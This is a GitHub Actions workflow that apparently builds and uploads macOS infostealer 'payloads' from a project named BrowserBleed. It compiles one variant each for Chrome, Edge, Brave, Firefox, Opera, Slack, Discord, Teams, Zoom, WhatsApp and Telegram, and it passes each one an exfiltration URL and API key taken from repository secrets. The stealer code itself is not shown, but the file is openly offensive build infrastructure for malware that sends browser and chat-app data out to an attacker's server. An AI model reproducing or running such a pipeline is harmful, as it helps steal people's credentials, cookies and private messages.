name: Build macOS payloads

on:
  workflow_dispatch:
  push:
    branches: [master]
    paths:
      - 'BrowserBleed_mac.py'
      - 'build_mac.sh'
      - 'browserbleed/**'

jobs:
  build:
    runs-on: macos-latest

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install dependencies
        run: pip install cryptography nuitka zstandard

      - name: Install bash 5 (macOS ships bash 3.2; build_mac.sh needs 4+)
        env:
          HOMEBREW_NO_AUTO_UPDATE: 1
        run: brew install bash

      - name: Build and upload payloads
        env:
          EXFIL_URL: https://${{ secrets.DOMAIN }}
          EXFIL_KEY: ${{ secrets.BB_API_KEY }}
        run: |
          export PATH="$(brew --prefix)/bin:$PATH"
          echo "== python diagnostic =="
          which python python3 python3.12 2>&1 || true
          python --version 2>&1 || true
          python3 --version 2>&1 || true
          # setup-python exposes 'python'; link it as python3/python3.12 for build_mac.sh
          mkdir -p "$RUNNER_TEMP/bin"
          PYBIN="$(python -c 'import sys; print(sys.executable)' 2>/dev/null || true)"
          if [ -n "$PYBIN" ]; then
            ln -sf "$PYBIN" "$RUNNER_TEMP/bin/python3"
            ln -sf "$PYBIN" "$RUNNER_TEMP/bin/python3.12"
            echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"
            export PATH="$RUNNER_TEMP/bin:$PATH"
          fi
          chmod +x build_mac.sh
          for p in chrome edge brave firefox opera slack discord teams zoom whatsapp telegram; do
            echo "=== BUILDING $p ==="
            ./build_mac.sh --preset "$p" --exfil-url "$EXFIL_URL" --exfil-key "$EXFIL_KEY" --upload || echo "FAILED $p"
          done
